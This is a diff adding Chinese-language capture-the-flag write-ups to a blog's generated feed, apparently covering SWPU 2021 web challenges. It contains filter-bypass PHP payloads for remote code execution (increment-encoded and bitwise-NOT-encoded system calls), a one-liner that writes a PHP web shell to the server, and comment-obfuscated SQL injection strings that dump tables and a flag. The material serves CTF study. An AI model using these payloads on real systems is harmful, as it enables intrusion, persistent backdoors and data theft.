@@ -3706,6 +3706,79 @@ public function __toString()&#123;
 <p>后面再用data伪协议读取flag</p>
 <p><img src="/2021/10/04/web/2/image-20211014212448219.png" alt="image-20211014212448219"></p>
 <p><img src="/2021/10/04/web/2/image-20211014212513570.png" alt="image-20211014212513570"></p>
+<h3 id="hardrce-3"><a href="#hardrce-3" class="headerlink" title="hardrce_3"></a>hardrce_3</h3><p><img src="/2021/10/04/web/2/image-20211015195502084.png" alt="image-20211015195502084"></p>
+<p>get传参，提示了异或和取反都不能用，过滤数字</p>
+<p>一旦绕过便可以执行eval</p>
+<p>用了mumuzi的payload</p>
+<p>自增：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27%21%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用这个便可绕过</p>
+<p>然后POST传参执行</p>
+<p>先用了phpinfo();查看信息</p>
+<p><img src="/2021/10/04/web/2/image-20211015195902281.png" alt="image-20211015195902281"></p>
+<p>禁用了很多函数</p>
+<p>然后采用写入一句话木马</p>
+<p>最开始用了mumzi的原payload，发现不行</p>
+<p>行吧，我去问了同班大佬</p>
+<p>原来是有点语法错误</p>
+<p>mumuzi的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_&#x3D;file_put_contents(‘1.php’,’&lt;?php @eval($_POST[&#39;aaa&#39;]);?&gt;’);</span><br></pre></td></tr></table></figure>
+
+<p>大佬说这是单引号的事</p>
+<p><img src="/2021/10/04/web/2/image-20211015202332038.png" alt="image-20211015202332038"></p>
+<p>加上/转义或者双引号就好</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents(&#39;1.php&#39;,&quot;&lt;?php @eval($_POST[&#39;aaa&#39;]); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>成功写入</p>
+<p><img src="/2021/10/04/web/2/image-20211015202427417.png" alt="image-20211015202427417"></p>
+<p>访问/1.php便可以连上</p>
+<p>但是连上后疯狂提示：你没有权限</p>
+<p>我血压直接升上来</p>
+<p>查到文章提权</p>
+<p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户</a></p>
+<p>其中一个办法：</p>
+<p><img src="/2021/10/04/web/2/image-20211015202542795.png" alt="image-20211015202542795"></p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>但是我没有权限写入文件，就只好用另外一个办法</p>
+<p><img src="/2021/10/04/web/2/image-20211015202632039.png" alt="image-20211015202632039"></p>
+<p>这样就写入了一个文件：</p>
+<p><img src="/2021/10/04/web/2/image-20211015202731031.png" alt="image-20211015202731031"></p>
+<p>然后再一次写入文件，开副本连接</p>
+<p><img src="/2021/10/04/web/2/image-20211015202806970.png" alt="image-20211015202806970"></p>
+<p><img src="/2021/10/04/web/2/image-20211015202832268.png" alt="image-20211015202832268"></p>
+<p>这次就有权限了</p>
+<p>不过我执行/readflag没有出来</p>
+<p><img src="/2021/10/04/web/2/image-20211015202918413.png" alt="image-20211015202918413"></p>
+<p>慢慢找也能找到</p>
+<p><img src="/2021/10/04/web/2/image-20211015202944977.png" alt="image-20211015202944977"></p>
+<p>后记：</p>
+<p><a href="https://blog.csdn.net/hackzkaq/article/details/119569104">通过代码执行或命令执行写Shell_hackzkaq的博客-CSDN博客</a></p>
+<p>mumuzi推荐的文章</p>
+<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<p><img src="/2021/10/04/web/2/image-20211015203608988.png" alt="image-20211015203608988"></p>
+<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>这次遇到了不一样的空格替换  /**/</p>
+<p>后面我还不直到是什么鬼</p>
+<p><a href="https://blog.csdn.net/qq_42880719/article/details/120581707?spm=1001.2014.3001.5501">SWPU新生赛2021 Web部分WriteUp_是Mumuzi的博客-CSDN博客</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;database()&#x2F;**&#x2F;having&#x2F;**&#x2F;&#39;1&#39;&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>还有</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),mid(flag,1,40)&#x2F;**&#x2F;from&#x2F;**&#x2F;LTLT_flag&#x2F;**&#x2F;having&#x2F;**&#x2F;&#39;1&#39;&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;1</span><br><span class="line"></span><br><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),mid(flag,15,40)&#x2F;**&#x2F;from&#x2F;**&#x2F;LTLT_flag&#x2F;**&#x2F;having&#x2F;**&#x2F;&#39;1&#39;&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;1</span><br><span class="line"></span><br><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),mid(flag,25,40)&#x2F;**&#x2F;from&#x2F;**&#x2F;LTLT_flag&#x2F;**&#x2F;having&#x2F;**&#x2F;&#39;1&#39;&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h3><p>无字母，不能用^符号，于是采用~来getshell</p>
+<p>借用博客：<a href="https://blog.csdn.net/qq_42880719/article/details/120581707?spm=1001.2014.3001.5501">SWPU新生赛2021 Web部分WriteUp_是Mumuzi的博客-CSDN博客</a></p>
+<p>​                    <a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<p>~url编码绕过</p>
+<p>首先system：</p>
+<p>小脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;ls&quot;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(&#39;%&#39;+str(hex((255)-ord(s[i]))[2:]),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>s里面想用什么就输入什么<br>首先system(ls /);</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?wllm&#x3D;~(~%8C%86%8C%8B%9A%92)(~%93%8c%df%d0);</span><br></pre></td></tr></table></figure>
+
+<p>发现flllllaaaaaaggggggg<br>然后tac /flllllaaaaaaggggggg即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?wllm&#x3D;~(~%8C%86%8C%8B%9A%92)(~%8b%9e%9c%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>web</tag>
